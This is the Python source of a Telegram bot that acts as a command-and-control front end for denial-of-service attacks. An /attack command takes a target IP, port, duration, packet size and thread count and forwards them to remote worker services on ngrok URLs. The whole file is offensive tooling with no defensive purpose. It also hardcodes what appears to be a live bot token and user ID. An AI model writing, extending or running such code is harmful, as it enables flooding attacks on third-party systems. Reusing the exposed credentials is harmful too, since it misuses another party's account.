import asyncio
import random
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7777598852:AAG3lK3DQVKZ2LvHm4cGgSIB_JpIjzG90C0'
ALLOWED_USER_ID = 6073143283

# List of ngrok URLs for worker services
WORKER_URLS = [
    "https://b645-54-226-127-232.ngrok-free.app",
    "http://ngrok-url-2.ngrok.io",
    "http://ngrok-url-3.ngrok.io"
]

# Function to get a worker URL
def get_worker_url():
    # Use a random URL from the list
    return random.choice(WORKER_URLS)

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <packet_size> <threads>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def send_to_worker(chat_id, payload, context):
    # Get a worker URL and prepare the endpoint
    worker_url = get_worker_url()
    endpoint = f"{worker_url}/run_sid"

    try:
        # Send POST request to the worker
        response = requests.post(endpoint, json=payload, timeout=10)
        response_data = response.json()

        if response.status_code == 200:
            # Success - Display worker response
            await context.bot.send_message(chat_id=chat_id, text=(
                "*✅ Attack Command Sent to Worker! ✅*\n\n"
                f"*Worker URL:* {worker_url}\n"
                f"*Worker Output:*\n```\n{response_data.get('output', 'No output')}\n```\n"
                f"*Worker Errors:*\n```\n{response_data.get('error', 'No errors')}\n```"
            ), parse_mode='Markdown')
        else:
            # Failure - Display error message
            await context.bot.send_message(chat_id=chat_id, text=(
                f"*❌ Worker Failed with Status {response.status_code}:*\n```\n{response_data.get('error', 'No details')}\n```"
            ), parse_mode='Markdown')
    except Exception as e:
        # Handle exceptions
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error communicating with worker: {str(e)}*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is authorized
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 5:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration> <packet_size> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, packet_size, threads = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*📦 Packet Size: {packet_size} bytes*\n"
        f"*🔀 Threads: {threads}*\n"
        f"*🔥 Sending to worker bot! 💥*"
    ), parse_mode='Markdown')

    # Prepare payload for worker service
    payload = {
        "ip": ip,
        "port": port,
        "time": duration,
        "packet_size": packet_size,
        "threads": threads
    }

    # Send payload to the worker
    asyncio.create_task(send_to_worker(chat_id, payload, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
